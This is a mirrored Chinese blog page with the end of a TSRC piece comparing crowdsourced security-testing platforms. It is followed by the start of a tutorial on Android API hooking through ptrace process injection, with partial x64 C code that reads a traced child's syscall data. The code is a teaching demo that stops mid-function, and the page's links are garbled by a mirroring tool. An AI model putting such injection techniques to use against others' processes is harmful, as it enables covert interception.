宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif"><span style="white-space: pre">&nbsp;&nbsp;</span>最后，Sobug上的漏洞细节也不会公开。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px">&nbsp;</p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><strong><span style="font-size: 12pt; font-family: 微软雅黑, sans-serif">五）总结</span></strong></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">以上就是TSRC作为厂商参与体验三大安全众测平台的一些主观感受，一家之言，读者就姑妄听之。（注：为避免争议，各平台的描述均预先发给官方阅读过）</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">我们再来以厂商视角谈谈对安全众测平台的期望。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">其实厂商之所以参与众测，就是希望平台上的众多白帽子能以不同的视角去发现产品安全问题，并协助修复。所以厂商对平台的忧虑主要包括：</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><strong><span style="font-family: 微软雅黑, sans-serif">保密性</span></strong><span style="font-family: 微软雅黑, sans-serif">。厂商首先要考虑的是漏洞的保密问题。安全众测平台本身就是独立于厂商的第三方，平台还可以问责，但白帽子是独立于平台之外的，白帽子人品是否可靠，这是厂商最担心的；</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><strong><span style="font-family: 微软雅黑, sans-serif">专业性</span></strong><span style="font-family: 微软雅黑, sans-serif">。参与众测的厂商大部分应该是中小企业，这部分用户本身对安全技术的理解能力有限，白帽子的报告如果写得很随意，比如修复方案写&ldquo;你懂的&rdquo;，这对厂商来说就不是很好；平台的核心是白帽子，在三大平台竞争的环境下如何留住能力很强的白帽子，也是对平台的一个考验；</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><strong><span style="font-family: 微软雅黑, sans-serif">合规性</span></strong><span style="font-family: 微软雅黑, sans-serif">。企业都有相关的经费使用流程，所以签订合同是必须的。同时，有了合同也可以避免后期在金额上的分歧，也是企业漏洞不被滥用的合法保障；</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><strong><span style="font-family: 微软雅黑, sans-serif">流程和体验</span></strong><span style="font-family: 微软雅黑, sans-serif">。这个就只能排最后了，毕竟，厂商找众测是发现和修复漏洞，流程不完善可以忍。但是在同等能力的情况下，流程和体验就会成为脱颖而出的重要因素了。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">只要哪个众测平台能够解决以上问题，相信未来都会有很多发展空间。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">我们可以看到，安全众测这个市场才起步，还有很多地方可以完善。这个市场需求也很大，相信如果有团队持之以恒地去探索和改进，这对白帽子、企业和平台本身甚至行业都是有利的。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-family: 微软雅黑, sans-serif">最后，让我们祝乌云众测、漏洞盒子、Sobug越办越好，TSRC愿与你们一起，共同捍卫互联网安全。</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">【延伸阅读】</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">《对众测平台的深度分析》，<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://taosay.net/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://taosay.net/content/images/2016/06/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/read.php/index.php/read.php/'" tppabs="http://taosay.net/index.php/2014/05/27/%E5%AF%B9%E4%BC%97%E6%B5%8B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">http://taosay.net/index.php/2014/05/27/%E5%AF%B9%E4%BC%97%E6%B5%8B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</a></span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">&nbsp;</span></p><p style="margin: 0px; padding: 0px; color: #333333; font-family: 微软雅黑, Tahoma, 宋体; font-size: 14px; line-height: 24px"><span style="font-family: 微软雅黑, sans-serif">《张耀疆：我也说说安全众测》，<a style="text-decoration: none; outline: none; color: #002e8c" href="javascript:if(confirm('http://www.e365.org/read.php?6649  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.e365.org/read.php?6649'" tppabs="http://www.e365.org/?p=11456">http://www.e365.org/?p=11456</a></span></p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Nov</span>
	<span class="textbox-calendar-day">26</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6196.htm" tppabs="http://i.renjihe.com/blog/read.php?6196">玩转Hook——Android权限管理功能探讨（一）</a> <span id="starid6196"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 22:01 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6196.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6196#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6196");'>引用(0)</a> , <a href="read.php-6196.htm" tppabs="http://i.renjihe.com/blog/read.php?6196">阅读(2)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6196" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="margin: 10px auto; padding: 0px"><span style="margin: 0px; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 18px">http://www.cnblogs.com/zealotrouge/p/3544147.html<br /></span><span style="line-height: 1.5">随着Android设备上的隐私安全问题越来越被公众重视，恶意软件对用户隐私，尤其是对电话、短信等私密信息的威胁日益突出，各大主流安全软件均推出了自己的隐私行为监控功能，在root情况下能有效防止恶意软件对用户隐私的窃取，那么这背后的技术原理是什么？我带着疑问开始一步步探索，如果要拦截恶意软件对电话、短信等API的调用，在Java或者Dalvik层面是不好进行的，因为这些层面都没有提供Hook的手段，而在Native层面，我认为可行的方案是对电话、短信的运行库so进行Hook（比如系统运行库&#92;system&#92;lib&#92;libreference-ril.so或&#92;system&#92;lib&#92;libril.so），如果注入自己的so到上述进程后，并通过dlopen()和dlsym()获取原有API地址，替换原有API地址为自己so中的API地址就可以达到Hook的目的。</span></span></span></p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　Hook的前提是进程注入，而Linux下最便捷的进程注入手段&mdash;&mdash;ptrace，是大名鼎鼎的调试工具GDB的关键技术点；本文参考自Pradeep Padala于2002年的博文<a style="margin: 0px; padding: 0px; text-decoration: none; outline: none; color: #3b5999; line-height: 1.5" href="javascript:if(confirm('http://www.linuxjournal.com/article/read.php?6645  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.linuxjournal.com/article/read.php?6645'" tppabs="http://www.linuxjournal.com/article/6100">http://www.linuxjournal.com/article/6100</a>（国内很多博客有这篇文章的译文，不过本着获取&ldquo;一手&rdquo;知识的想法，还是细读了原版英文，确实发现了一些翻译得不够到位的地方，在此还是推荐各位能读原文就不要读译文），由于02年时还是ia32（32位Intel <span style="margin: 0px; padding: 0px; line-height: 18px">Architecture</span>）时代，时至今日，在我ia64也就是x64的机器已经无法运行了，所以自己动手实现了x64版本。代码主要功能是注入子进程的地址空间，Hook住子进程执行系统调用时的参数，并反转其参数，从而逆序输出ls命令的结果。</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　代码如下：<br /></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">/*</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; ptrace3.c</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; author: pengyiming</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; description:</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; 1, child process need be traced by father process</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; 2, father process reserve the result of &quot;ls&quot; command which executed by child process</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">*/</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;stdio.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;stdlib.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;string.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/ptrace.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/types.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/wait.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/reg.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/user.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;sys/syscall.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#include &lt;unistd.h&gt;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#ifdef __x86_64__</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; #define OFFSET_UNIT 8</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#else</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; #define OFFSET_UNIT 4</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">#endif</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">// converter long to char[]</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">union</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; long rawData;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; char strData[sizeof(long)];</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125; converter;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">void getData(pid_t child, unsigned long long dataAddr, unsigned long long dataLen, char * const p_data)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // PEEKDATA counter</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int counter = 0;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // PEEKDATA max count</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int maxCount = dataLen / sizeof(long);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; if (dataLen % sizeof(long) != 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; maxCount++;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // moving pointer</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; void * p_moving = p_data;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; while (counter &lt; maxCount)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memset(&amp;converter, 0, sizeof(long));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; converter.rawData = ptrace(PTRACE_PEEKDATA, child, dataAddr + counter * sizeof(long), NULL);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; if (converter.rawData &lt; 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; perror(&quot;ptrace peek data error : &quot;);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memcpy(p_moving, converter.strData, sizeof(long));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; p_moving += sizeof(long);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; counter++;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; p_data[dataLen] = '&#92;0';</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">void setData(pid_t child, unsigned long long dataAddr, unsigned long long dataLen, char * const p_data)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span 